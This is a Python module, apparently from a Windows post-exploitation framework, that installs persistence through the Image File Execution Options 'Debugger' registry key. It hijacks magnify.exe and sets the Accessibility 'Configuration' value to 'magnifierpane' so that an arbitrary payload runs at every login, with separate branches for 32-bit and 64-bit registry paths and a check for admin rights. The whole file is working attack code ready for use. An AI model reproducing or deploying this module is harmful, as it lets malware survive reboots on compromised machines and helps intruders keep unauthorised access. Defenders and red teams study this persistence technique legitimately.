import os
import wmi
import ctypes
import _winreg
from core.prints import *
from core.utils import *

ifeo_info = {
        "Description": "Gain persistence using IFEO debugger registry key",
		"Id" : "18",
		"Type" : "Persistence",	
		"Fixed In" : "99999",
		"Works From": "7600",
		"Admin": True,
		"Function Name" : "ifeo",
		"Function Payload" : True,
    }

def create_magnifierpane_key(path):	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join(path))
		_winreg.SetValueEx(key,"Configuration",0,_winreg.REG_SZ,"magnifierpane")
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def create_debugger_key(path,payload):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path))
		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def ifeo(payload):
	if (information().admin() == True):
		if ("64" in information().architecture()):
			if (create_debugger_key("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
				print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
				if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
					print_success("Successfully installed persistence, payload will run at login")
				else:
					print_error("Unable to install persistence")
					return False
			else:
				print_error("Unable to install persistence")
				return False
		else:
			if (create_debugger_key("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
				print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
				if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
					print_success("Successfully installed persistence, payload will run at login")
				else:
					print_error("Unable to install persistence")
					return False
			else:
				print_error("Unable to install persistence")
				return False
	else:
		print_error("Cannot proceed, we are not elevated")
		return False